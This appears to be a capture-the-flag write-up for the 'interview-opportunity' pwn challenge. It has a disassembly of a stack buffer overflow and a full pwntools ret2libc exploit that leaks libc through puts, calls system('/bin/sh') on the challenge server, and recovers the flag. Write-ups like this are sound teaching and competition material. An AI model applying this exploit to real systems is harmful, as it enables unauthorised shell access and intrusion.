# interview-opportunity

## Challenge

The program prints an opening message and prompts for user input.

Input is printed back to the user, then the program exits.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

If we disassemble the `main` function, we find that it reads more bytes than the buffer can hold.

```asm
[0x004010a0]> pdf @ main
            ; DATA XREF from entry0 @ 0x4010c1
┌ 102: int main (int argc, char **argv);
│           ; var char *buf @ rbp-0x1a
│           ; var char **var_10h @ rbp-0x10
│           ; var int64_t var_4h @ rbp-0x4
│           ; arg int argc @ rdi
│           ; arg char **argv @ rsi
│           0x00401240      55             push rbp
│           0x00401241      4889e5         mov rbp, rsp
│           0x00401244      4883ec20       sub rsp, 0x20
│           0x00401248      897dfc         mov dword [var_4h], edi     ; argc
│           0x0040124b      488975f0       mov qword [var_10h], rsi    ; argv
│           0x0040124f      e86cffffff     call sym.env_setup
│           0x00401254      48bf2a204000.  movabs rdi, str.Thank_you_for_you_interest_in_applying_to_DiceGang._We_need_great_pwners_like_you_to_continue_our_traditions_and_competition_against_perfect_blue._n ; 0x40202a ; "Thank you for you interest in applying to DiceGang. We need great pwners like you to continue our traditions and competition against perfect blue.\n" ; const char *format
│           0x0040125e      b000           mov al, 0
│           0x00401260      e8dbfdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00401265      48bfbe204000.  movabs rdi, str.So_tell_us._Why_should_you_join_DiceGang__n ; 0x4020be ; "So tell us. Why should you join DiceGang?\n" ; const char *format
│           0x0040126f      b000           mov al, 0
│           0x00401271      e8cafdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00401276      488d75e6       lea rsi, [buf]              ; void *buf
│           0x0040127a      31ff           xor edi, edi                ; int fildes
│           0x0040127c      ba46000000     mov edx, 0x46               ; 'F' ; 70 ; size_t nbyte
│           0x00401281      e8dafdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x00401286      48bfe9204000.  movabs rdi, str.Hello:_     ; 0x4020e9 ; "Hello: " ; const char *s
│           0x00401290      e89bfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00401295      488d7de6       lea rdi, [buf]              ; const char *s
│           0x00401299      e892fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040129e      31c0           xor eax, eax
│           0x004012a0      4883c420       add rsp, 0x20
│           0x004012a4      5d             pop rbp
└           0x004012a5      c3             ret
```

The function reads 0x4a bytes into a buffer of size 0xa.
PIE is disabled and there is no canary, so ret2libc is trivial here.

We can use the buffer overflow to overwrite the return address and control RIP.

Our ropchain leaks the libc address by calling `puts` and passing it the GOT entry of `puts`.
This will print the address of `puts` in libc, which we can use to calculate the base address.
We then return to main so we can create a second ropchain to spawn a shell.

Once we have read the libc leak, we calculate the addresses of `system` and `"/bin/sh"` within libc.
We use the same buffer overflow to call `system("/bin/sh")` and spawn a shell.
Now we can read the flag.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mc.ax --port 31081 interview-opportunity
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('interview-opportunity')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mc.ax'
port = int(args.PORT or 31081)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

rop = ROP(exe)

payload = flat({
    0x0: 0,
    0x1a+0x8: [
        rop.find_gadget(['pop rdi', 'ret'])[0],
        exe.got['puts'],
        exe.plt['puts'],
        exe.sym['main'],
        ],
    })

io.sendlineafter(b"So tell us. Why should you join DiceGang?\n", payload)
io.recvuntil(b"Hello: \n\n")

libc.address = unpack(io.recvuntil(b"\n", drop=True).ljust(8, b'\x00')) - libc.sym['puts']
io.success(hex(libc.address))

payload = flat({
    0x0: 0,
    0x1a+0x8: [
        rop.find_gadget(['pop rdi', 'ret'])[0],
        next(libc.search(b"/bin/sh")),
        libc.sym['system'],
        ],
    })

io.sendlineafter(b"So tell us. Why should you join DiceGang?\n", payload)
io.recvuntil(b"Hello: \n\n")

io.interactive()
```

## Flag

```
dice{0ur_f16h7_70_b347_p3rf3c7_blu3_5h4ll_c0n71nu3}
```
